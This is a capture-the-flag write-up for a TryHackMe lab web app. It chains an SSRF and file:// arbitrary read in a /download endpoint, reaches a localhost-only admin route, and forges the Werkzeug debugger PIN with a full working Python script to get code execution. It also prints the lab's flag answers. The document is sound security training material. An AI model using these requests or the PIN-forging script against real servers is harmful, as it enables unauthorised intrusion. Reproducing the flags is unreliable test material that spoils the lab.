---
title: THM - Plant Photographer writeup
tags:
  - thm
  - writeup
---
## Enumeration

```
> nmap -sC -sV 10.49.170.153  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 20:30 +0800
Nmap scan report for 10.49.170.153
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e5:b0:57:b8:9c:f5:7e:72:28:df:82:cc:31:2c:5f:b3 (RSA)
|   256 fe:f4:bb:36:66:ef:47:33:7b:01:49:ee:e1:3f:bf:8e (ECDSA)
|_  256 0a:8c:f2:f7:0e:d0:62:05:84:b5:e5:d1:88:07:a6:e4 (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.10.7)
|_http-title: Jay Green
|_http-server-header: Werkzeug/0.16.0 Python/3.10.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.51 seconds
```

## Werkzeug debugger log: Flag-1

Inspect the web server brings us to a portfolio page.

![](/images/Pasted_image_20260408213451.png)

We notice a download button allowing us to download a PDF file, inspecting its request:

![](/images/Pasted_image_20260408213544.png)

Note the `server` parameter is an internal URL, which highly suggests an SSRF vulnerability. I then tried to modify the `server` parameter to see if I can access the web server from locahost. Though it was initially not successful, we did find out the Werkzeug debugger log being available to us.

![](/images/Pasted_image_20260408213815.png)

We also find our first flag  `THM{Hello_Im_just_an_API_key}` inside the log.

![](/images/Pasted_image_20260408213853.png)

## SSRF to admin: Flag-2

We can find out how the server construct the request to get the PDF file within the debugger log as well.

```
crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
```

With this knowledge, we can leak `app.py`. At first, I tried to just path traversal up `../../` to reach `app.py` but it seems `app.py` will process `id` with `int()` thus this will not work. 

![](/images/Pasted_image_20260408214600.png)

However, we can use [URI fragment `#`](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Fragment) like the following to simply cut off everything after `/public-docs...` to achieve arbitrary read. The following request will read `app.py` out. 

```
GET /download?server=file:///usr/src/app/app.py%23&id=1 HTTP/1.1
```

which clearly defines how `/admin` can be reached:

```python
@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"
    
# omitted...

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8087, debug=True)
```

We utilize the same SSRF endpoint `/download` to reach it.

```
GET /download?server=http://127.0.0.1:8087/admin%23&id=1 HTTP/1.1
```

`flag.pdf` will give us the second flag `THM{c4n_i_haz_flagz_plz?}`.

![](/images/Pasted_image_20260408214923.png)

## RCE via debugger console: Flag-3

Since we have debugger active, we might also check if we can access `/console` (see [HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)) Indeed we can, but a PIN is required. The previous HackTricks article has a detailed explanation on how to generate the PIN ourselves given an arbitrary file read vulnerability, where we already achieved via SSRF on `/download` using the `file://` protocol. We can also get the PIN generation logic at `/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py` to verify.

Although I tried [`wconsole_extractor`](https://github.com/Ruulian/wconsole_extractor) but it doesn't really work. Instead I dumped the logic to some LLM and made it write the PIN generation logic from it. The issue probably lies in the actual implementation I found:

```python
def _generate(): # docker containers share the same machine id, get the # container id instead 
	try: 
		with open("/proc/self/cgroup") as f: 
			value = f.readline() 
	except IOError: 
			pass 
	else: 
		value = value.strip().partition("/docker/")[2] 
		if value: 
			return value # <--- this line
```

From HackTricks I thought the `machine_id` part was made by concating `/proc/sys/kernel/random/boot_id` and `/proc/self/cgroup`, but it turns out to just be the latter.

With this in mind, we have the final PIN generator.
```python
import requests
import hashlib
from itertools import chain

# The target URL
HOST = "http://10.48.134.28"

def read_file(filepath):
    """Uses our SSRF primitive to read local files."""
    url = f"{HOST}/download?server=file://{filepath}%23&id=1"
    try:
        r = requests.get(url)
        if r.status_code == 200 and "pycurl.error" not in r.text:
            return r.text.strip()
    except Exception as e:
        pass
    return ""

print("[*] Fetching system variables via SSRF...")

# 1. Get and parse MAC Address
mac_raw = read_file("/sys/class/net/eth0/address")
if not mac_raw:
    print("[-] Failed to read MAC address.")
    exit(1)
mac_decimal = str(int(mac_raw.replace(":", ""), 16))
print(f"[+] MAC Address: {mac_raw} -> {mac_decimal}")

# 2. Get Machine ID (Implementing the EXACT logic from the source dump)
cgroup_raw = read_file("/proc/self/cgroup")
machine_id = ""

if cgroup_raw:
    # Grab the very first line
    first_line = cgroup_raw.split('\n')[0].strip()
    
    # Werkzeug Source: value = value.strip().partition("/docker/")[2]
    if "/docker/" in first_line:
        machine_id = first_line.partition("/docker/")[2]
        print(f"[+] Docker environment detected!")
        print(f"[+] Using ONLY Container ID as Machine ID: {machine_id}")

# Fallback just in case (as written in the Werkzeug source)
if not machine_id:
    print("[-] Docker hash not found. Falling back to boot_id...")
    machine_id = read_file("/proc/sys/kernel/random/boot_id").strip()
    print(f"[+] Boot ID: {machine_id}")

private_bits = [
    mac_decimal,
    machine_id
]

print("\n[*] Generating Werkzeug PINs...")
print("-" * 40)

public_bits = [
    'root',  # Verified via /proc/self/status Uid: 0 0 0 0
    'flask.app',  
    'Flask' 
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  
]
    
# Using MD5 as confirmed by the source code dump
h = hashlib.md5()
    
for bit in chain(public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode('utf-8')
    h.update(bit)
        
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
    
num = None
if num is None:
    h.update(b'pinsalt')
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

We have the console! 

![](/images/Pasted_image_20260408235353.png)

It is now trivial to find the flag using `os` module. As expected, the flag text file is under a randomized suffix so it is impractical to guess in the first place. The last flag is `THM{SSRF2RCE_2_1337_4_M3}`.

![](/images/Pasted_image_20260408235516.png)

![](/images/Pasted_image_20260408235540.png)
